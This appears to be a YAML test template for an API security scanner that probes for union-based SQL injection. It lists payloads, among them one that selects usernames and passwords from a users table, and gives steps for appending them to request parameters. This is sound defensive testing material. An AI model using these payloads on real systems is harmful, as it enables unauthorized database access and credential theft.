id: SMART_BASIC_UNION_BASED_SQLI
info:
  name: Basic Union based SQL Injection - Smart Testing
  description: >
    Test Union-based SQL injection by appending UNION SELECT payloads to
    injectable string parameters in body or query. Keep baseline method, URL,
    and auth headers intact; mutate only in-scope parameter values.
  details: >
    Clone the baseline. Across 4–5+ probes escalate column-count discovery
    (UNION SELECT null, null-- then more nulls), then data-oriented UNION
    SELECT variants, then alternate comment styles (#, /*). Target different
    string fields when useful. Proof vs baseline: THIS response shows real
    impact — dumped rows/columns not present in baseline, database/SQL error
    content proving the query ran, or clear structural data disclosure.
    Generic 200 with unchanged business payload, or merely echoing UNION/SELECT
    text, is NOT vulnerable. Prefer stronger column counts / different fields
    after a miss rather than stopping early.
  impact: >
    Unauthorized database access, sensitive data extraction, credential theft,
    and potential full compromise.
  category:
    name: NO_AUTH
    shortName: Broken Authentication
    displayName: Broken User Authentication (BUA)
  subCategory: SMART_BASIC_UNION_BASED_SQLI
  severity: MEDIUM
  agenticTestingAllowed: true
  onlySmartTestingAllowed: true
  tags:
    - Business logic
    - OWASP top 10
    - HackerOne top 10
  references:
    - https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/
    - https://github.com/OWASP/API-Security/blob/master/editions/2023/en/0xa2-broken-authentication.md
    - https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html
  cwe:
    - CWE-287
  cve:
    - CVE-2020-24008
    - CVE-2021-45901

attributes:
  nature: INTRUSIVE
  plan: PRO
  duration: FAST

api_selection_filters:
  response_code:
    gte: 200
    lt: 300
  method:
    neq: "OPTIONS"
  or:
    - request_payload:
        for_one:
          key:
            regex: .*
            extract: authKey
          value:
            extract: authValue
    - query_param:
        for_one:
          key:
            regex: .*
            extract: authKey
          value:
            extract: authValue

wordLists:
  unionBasedPayloads:
    - "' UNION SELECT null, null--"
    - "' UNION SELECT null, null, null--"
    - "' UNION SELECT null, username, password FROM users--"
    - "' UNION SELECT null, null#"

execute:
  type: single
  requests:
    - req:
        - modify_body_param:
            authKey: ${authValue}${unionBasedPayloads}
        - modify_query_param:
            authKey: ${authValue}${unionBasedPayloads}
